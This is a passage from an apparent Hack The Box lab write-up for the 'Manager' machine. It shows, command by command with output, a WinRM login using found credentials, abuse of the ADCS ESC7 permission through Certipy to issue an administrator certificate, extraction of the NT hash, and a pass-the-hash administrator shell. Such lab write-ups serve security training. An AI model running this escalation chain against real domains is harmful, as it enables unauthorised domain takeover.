┌──(kali㉿kali)-[~/htb/backup]
└─$ crackmapexec winrm 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
SMB         10.10.11.236    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
WINRM       10.10.11.236    5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
```

At this time, this credential is working on `winrm` as well. So we can open a shell through `evil-winrm` this time.

```bash
┌──(kali㉿kali)-[~/htb/share_sysvol/manager.htb]
└─$ evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
  
Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                 

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                   

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents>
```


# Shell as `administrator`

With a Windows domain, the next thing to check used to be Bloodhound, but lately it’s worth checking Advice Directory Certificate Services (ADCS) as well, and that’s quick, so I’ll start there. This can be done by uploading [Certify](https://github.com/GhostPack/Certify) or remotely with [Certipy](https://github.com/ly4k/Certipy). I find Certipy easier.

Here's the related article:
<https://book.hacktricks.xyz/kr/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation>

```bash
┌──(kali㉿kali)-[~/htb/Certipy]
└─$ certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
Certificate Templates                   : [!] Could not find any certificate templates
```

The result says that the user `raven` has dangerous permission `ESC7`.

Based on `ESC7 - Attack2` method explained in the reference above, let's try abusing the permission.
First, I need to add `raven` itself to the CA manager permission group.

```bash
┌──(kali㉿kali)-[~/htb/Certipy]
└─$ certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

Then, let's check `SubCA` template, and activate it if it's disabled.

```bash
┌──(kali㉿kali)-[~/htb/Certipy]
└─$ certipy ca -ca 'manager-DC01-CA' -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[-] No action specified
                                                                           
┌──(kali㉿kali)-[~/htb/Certipy]
└─$ certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```

Then, check if the template is successfully added.

```bash
┌──(kali㉿kali)-[~/htb/Certipy]
└─$ certipy ca -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -list-templates
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Enabled certificate templates on 'manager-dc01-ca':
    SubCA
    DirectoryEmailReplication
    DomainControllerAuthentication
    KerberosAuthentication
    EFSRecovery
    EFS
    DomainController
    WebServer
    Machine
    User
    Administrator
```


Then, using the `SubCA` template, let's request certificate.

```vbnet
┌──(kali㉿kali)-[~/htb/Certipy]
└─$ certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target-ip 10.10.11.236 -template SubCA -upn administrator@manager.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 20
Would you like to save the private key? (y/N) y
[*] Saved private key to 20.key
[-] Failed to request certificate
```

It is expected to be failed based on the article. Anyway, I can check the Request ID is 20.

```bash
┌──(kali㉿kali)-[~/htb/Certipy]
└─$ certipy ca -ca manager-DC01-CA -issue-request 20 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'

[*] Successfully issued certificate
```

Now the issued certificate can be retrieved using `req` command.

```bash
certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
Certipy v4.8.2 - by Oliver Lyak (ly4k)    
                                                                    
[*] Rerieving certificate with ID 20          
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '20.key'                     
[*] Saved certificate and private key to 'administrator.pfx'
```

Then, let's try using it.

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236                                   
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

Here I can extract NTLM hash : `ae5064c2f62317332c88629e025924ef`
Let's try cracking this hash using `hashcat`

```bash
┌──(kali㉿kali)-[~/htb]
└─$ hashcat -m 1000 -a 0 hash /usr/share/wordlists/rockyou.txt.gz

<SNIP>
Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: ae5064c2f62317332c88629e025924ef
Time.Started.....: Thu Nov 28 08:49:42 2024 (2 secs)
Time.Estimated...: Thu Nov 28 08:49:44 2024 (0 secs)
<SNIP>
```

It's not crackable... but still we can use the NTLM hash itself.
Let's try opening a shell using `evil-winrm`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i 10.10.11.236 -u administrator -H 'ae5064c2f62317332c88629e025924ef'
 
Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine               

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                 

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
manager\administrator
```

Yeah, now I have a shell!